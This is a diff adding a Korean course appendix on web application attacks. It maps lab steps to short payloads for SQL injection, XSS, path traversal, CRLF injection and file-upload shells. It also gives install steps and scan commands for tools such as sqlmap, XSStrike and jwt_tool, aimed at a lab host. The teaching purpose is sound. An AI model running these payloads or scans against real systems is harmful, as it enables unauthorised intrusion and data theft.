@@ -929,3 +929,75 @@ for e in json.load(sys.stdin)[:5]:
 3. 동일 src 의 *세션 ID 변화 빈도* 측정 — 정상 사용자 baseline 대비 5배 이상이면 *자동화 도구* 의심
 
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course1 Attack — Week 04 웹 애플리케이션 공격)
+
+| 공격 유형 | lab step | 본문 명령 | OSS 도구 옵션 | 비고 |
+|----------|----------|----------|---------------|------|
+| SQLi (로그인 우회) | s1 | `curl -d email='or 1=1--` | sqlmap -u "..." -p email --batch / Burp Repeater | sqlmap 자동화 |
+| JWT 디코딩/조작 | s2 | `python3 base64 decode` | jwt_tool / jwt-cracker / pyjwt | jwt_tool 표준 |
+| Reflected XSS | s3 | `curl ?q=<iframe>` | XSStrike / dalfox / xsser | XSStrike 가장 강력 |
+| Mass Assignment (role=admin) | s4 | `curl POST {role:admin}` | Burp Intruder / ffuf | API 변조 |
+| UNION SQLi | s5 | `curl ?q=1 UNION SELECT...` | sqlmap --technique=U / SQLNinja | sqlmap 가 자동 |
+| Stored XSS | s6 | `curl POST <script>` | dalfox / XSStrike / Burp scanner | dalfox stored 모드 |
+| Null Byte / Path Traversal | s7 | `curl /ftp/file%00.md` | ffuf -w wordlist -u /FUZZ / dotdotpwn | dotdotpwn 전용 |
+| 입력 검증 우회 | s8 | `curl rating=0` | Burp Intruder / ffuf | 클라이언트 검증 우회 |
+| CSRF 점검 | s9 | `curl GET change-password` | bolt (CSRF scanner) / xsrfprobe | xsrfprobe 권장 |
+| IDOR | s10 | `curl /basket/2` | autorize (Burp ext) / ffuf | 권한 비교 |
+| PUT 무단 수정 | s11 | `curl -X PUT` | Burp Repeater / httpie | RESTful API 변조 |
+| SVG XSS 업로드 | s12 | `curl --form file=@evil.svg` | weevely / msfvenom (PHP shell) / Burp | 파일 업로드 우회 |
+| HTTP 헤더 인젝션 | s13 | `curl -H "X-Forwarded-For: \r\n"` | crlf / smuggler / Burp | smuggler 가 HTTP smuggling 표준 |
+| 권한 우회 (admin URL) | s14 | `curl /administration` | autorize / Burp / 직접 url | 권한 매트릭스 |
+| OWASP Top10 보고 | s15 | text 정리 | dradis / serpico | 보고서 도구 |
+
+### 학생 환경 준비 (한 번만 실행)
+
+```bash
+ssh ccc@192.168.0.112
+
+sudo apt update && sudo apt install -y \
+  sqlmap ffuf gobuster nikto \
+  python3-pip git curl httpie jq
+
+# XSStrike — XSS 자동 점검 표준
+git clone https://github.com/s0md3v/XSStrike.git ~/XSStrike
+cd ~/XSStrike && pip3 install -r requirements.txt
+ln -sf ~/XSStrike/xsstrike.py ~/.local/bin/xsstrike
+
+# jwt_tool — JWT 점검
+git clone https://github.com/ticarpi/jwt_tool.git ~/jwt_tool
+cd ~/jwt_tool && pip3 install -r requirements.txt
+
+# dalfox (Go) — XSS 스캐너 (XSStrike 대안)
+go install github.com/hahwul/dalfox/v2@latest 2>/dev/null
+
+# xsrfprobe — CSRF 점검
+pip3 install xsrfprobe
+
+# dotdotpwn — Path Traversal 자동
+git clone https://github.com/wireghoul/dotdotpwn.git ~/dotdotpwn
+```
+
+### 핵심 도구 사용법 요약
+
+```bash
+# SQLi — sqlmap (자동)
+sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
+  --batch --random-agent --risk=3 --level=5
+
+# XSS — XSStrike (모든 모드 자동)
+python3 ~/XSStrike/xsstrike.py -u "http://10.20.30.80:3000/rest/products/search?q=test"
+
+# JWT — jwt_tool (자동 진단)
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -T
+
+# CSRF — xsrfprobe
+xsrfprobe -u http://10.20.30.80:3000
+
+# 디렉토리/파일 — ffuf
+ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.20.30.80:3000/FUZZ
+```
+
+학생은 본 4주차에서 **각 OWASP Top 10 카테고리 → 전용 도구** 매핑을 익힌다. curl + bash 로 시작하지만 빠르게 sqlmap·XSStrike·jwt_tool 같은 전문 도구로 전환.
